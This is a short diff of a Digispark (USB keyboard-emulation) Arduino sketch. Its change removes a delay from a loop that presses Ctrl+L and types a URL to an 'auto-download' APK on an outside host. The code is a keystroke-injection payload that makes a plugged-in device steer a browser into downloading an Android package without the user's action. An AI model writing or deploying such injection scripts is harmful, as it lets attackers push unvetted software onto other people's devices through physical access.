@@ -5,7 +5,6 @@ void setup() {}
 
 void loop() {
 	DigiKeyboard.sendKeyStroke(0);
-	DigiKeyboard.delay(500);
         DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,KEY_L);
 	DigiKeyboard.print("https://vishal-y.github.io/auto-download/1.apk");
 	DigiKeyboard.delay(2500);
